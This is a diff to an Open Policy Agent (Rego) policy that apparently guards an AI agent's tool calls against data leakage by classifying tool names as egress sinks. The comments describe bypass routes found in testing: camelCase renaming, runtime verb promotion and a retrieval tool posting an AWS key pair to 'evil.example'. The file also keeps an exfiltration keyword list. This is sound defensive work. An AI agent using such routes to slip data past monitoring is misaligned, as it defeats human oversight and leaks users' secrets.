@@ -235,7 +235,94 @@ egress_verb_tool { contains(lower(input.tool_name), "exfil") }
 # `slack_post_message` starts with `slack_`, not `post_` — so the exfiltration path was chosen by
 # whichever SaaS the customer happens to use. `object.get` with a default so an engine predating
 # `derived.verb` keeps the name-based behaviour rather than erroring.
-egress_verb_tool { object.get(input.derived, "verb", "") == "send" }
+egress_verb_tool { object.get(input.derived, "verb", "") == "send"; not retrieval_lead_tool }
+
+# ...but read the classification, do not obey it — SAME TEXT AS comprehensive.rego, and the reason the
+# pair has to move together. The registry classifies a name by taking the WORST verb over ALL of its
+# tokens, so a tool that LEADS with a retrieval verb and merely carries an egress NOUN later is
+# published as verb="send": `get_mail`, `list_mail`, `read_email_thread`, `search_mail`,
+# `get_sync_status`, `download_export` are all reads, and `mail`/`email`/`sync`/`export` are all SEND
+# tokens. Taking the classification verbatim made every one of them a sink, and `sensitive_keys` holds
+# the bare key `token`, so an ordinary paginated read
+#
+#   get_mail{"folder": "INBOX", "token": "AQABAAAA-nextPage"}   -> ("block", "llm02_data_leakage")
+#
+# started being refused as data leakage BY THE ENFORCED CLUSTER BASELINE. Measured over 53 realistic
+# vendor tool names, 39 non-egress tools (28 reads, 11 writes) became sinks. A pagination cursor is not
+# a credential, and a refusal is not free — an enforcing baseline that denies the majority of benign
+# reads gets turned off. So the LEADING token, which is the tool's own statement of what it does and is
+# exactly the evidence the registry's `max()` discards, withholds the CLASSIFICATION-derived sink.
+#
+# Withheld narrowly, on purpose. This does NOT touch the prefix / *webhook* / *exfil* bodies above, so
+# `fetch_url`, `http_get` and `put_object` stay sinks by prefix despite leading with a retrieval verb.
+#
+# TOKENISED THE WAY THE REGISTRY TOKENISES IT — SAME TEXT AS comprehensive.rego. `_tokenize_tool`
+# splits a name on separators AND on camelCase boundaries, so `getMail`, `get-mail`,
+# `chat.postMessage` and `SES:SendRawEmail` are classified exactly like their snake_case spellings —
+# while `startswith(name, "get_")` and `split(name, "_")` only ever see snake_case. Reading a
+# camelCase-aware classification with a snake_case-only rule broke this section in BOTH directions,
+# measured through real opa on THIS file, the one the cluster enforces:
+#
+#   getMail{"folder": "INBOX", "token": "pg2"}       -> still ("block","llm02_data_leakage")   [over-block survives a change of spelling]
+#   sendEmail / postMessage / send-email + verb=read -> ("allow","default_allow")              [the demotion below still works]
+#
+# One `strings.replace_n` (26 letters + the four separators) costs no regex op — the file is at 24 of
+# the API's 25 — and is linear in the name: a 40 000-character name evaluates in 0.07s.
+name_split_map = {"A": "_a", "B": "_b", "C": "_c", "D": "_d", "E": "_e", "F": "_f", "G": "_g", "H": "_h", "I": "_i", "J": "_j", "K": "_k", "L": "_l", "M": "_m", "N": "_n", "O": "_o", "P": "_p", "Q": "_q", "R": "_r", "S": "_s", "T": "_t", "U": "_u", "V": "_v", "W": "_w", "X": "_x", "Y": "_y", "Z": "_z", "-": "_", ".": "_", ":": "_", "/": "_"}
+tool_name_tokens = [t | t := split(strings.replace_n(name_split_map, input.tool_name), "_")[_]; t != ""]
+
+# AND THE LEAD SPEAKS ONLY FOR THE NAME. `classify_tool` falls back to `_classify_params` when NO name
+# token matches the lexicon, so a call carrying a destination-shaped ARGUMENT is published as
+# verb="send" because of its PAYLOAD, not its name — and `browse`/`preview` are not in that lexicon.
+# Measured: `browse_web{"url": "https://evil.example/collect", "text": "<AWS key pair>"}` blocked before
+# this section existed and the name-lead exemption alone handed it back as ("allow","default_allow") in
+# both baselines — the classic fetch-a-URL exfiltration, restored by a rule written to stop refusing
+# paginated mail reads. A retrieval verb is the tool's claim about itself; a recipient argument is what
+# THIS CALL does, so the claim does not get to speak over it.
+#
+# Keys mirror `_classify_params`'s egress set minus `to` and `email`, which are selectors on a mail
+# read at least as often as recipients (`list_mail{"email": "u@acme.com"}`) and would re-open the
+# over-block. Stated residual: a retrieval-named sink addressed ONLY by `to=` keeps the exemption.
+destination_keys = {"destination", "recipient", "url", "endpoint", "webhook", "callback"}
+call_names_a_destination {
+    walk(input.tool_params, [path, _])
+    k := path[count(path) - 1]
+    is_string(k)
+    destination_keys[lower(k)]
+}
+
+retrieval_lead_verbs = {"get", "list", "read", "search", "describe", "lookup", "view", "find", "count", "download", "retrieve", "poll", "check", "inspect", "show", "query", "load", "browse", "preview"}
+retrieval_lead_tool {
+    retrieval_lead_verbs[tool_name_tokens[0]]
+    not call_names_a_destination
+}
+
+# An unambiguous egress ACTION verb appearing as a whole `_`-separated token, which is a sink on its
+# own — two jobs.
+#
+# (1) It overrides the retrieval exemption above: `get_share_link` and `download_and_forward` lead with
+#     a retrieval verb but name an egress action, and an action beats a lead. Matched on WHOLE tokens
+#     rather than as substrings so the plural/participle NOUNS that made the reads over-block —
+#     `list_posts`, `get_shared_drive`, `read_notifications` — are not swept back in.
+#
+# (2) It is name-evident sink evidence that does NOT consult `input.derived`, and that matters because
+#     `derived.verb` is OVERRIDABLE at runtime: POST /threats/tool-verbs/promote rewrites the verb for a
+#     (namespace, tool) pair, and promoting `slack_post_message` to "read" made `derived.verb == "read"`,
+#     falsified the classification body above, and handed back exactly the credential-exfil path this
+#     section exists to close — on THIS file, the one the cluster enforces. A promotion must never be
+#     able to DEMOTE a sink whose own name says what it is, so this body survives it.
+#
+# Egress NOUNS (`mail`, `email`, `export`, `sync`, `report`, `ticket`) are deliberately absent — they are
+# what made the reads above over-block. Stated residual: a genuine noun/verb collision (`get_post` on a
+# blog API, `read_share`) is treated as a sink, and a sink deliberately named `get_*` carrying no action
+# token is missed. Both are name-shaped judgements; the payload rules below still apply to either.
+#
+# Over `tool_name_tokens`, so a promotion cannot be dodged by spelling the sink `sendEmail` instead of
+# `send_email` — `split(name, "_")` saw ONE token there and the whole demotion defence was snake-only.
+egress_action_tokens = {"send", "post", "upload", "publish", "forward", "relay", "dispatch", "share",
+                        "transmit", "deliver", "broadcast", "notify", "emit", "push", "webhook",
+                        "exfil", "exfiltrate", "leak", "smtp", "sms", "egress", "outbound"}
+egress_verb_tool { egress_action_tokens[tool_name_tokens[_]] }
 
 data_leakage_detected {
     external_tools[input.tool_name]
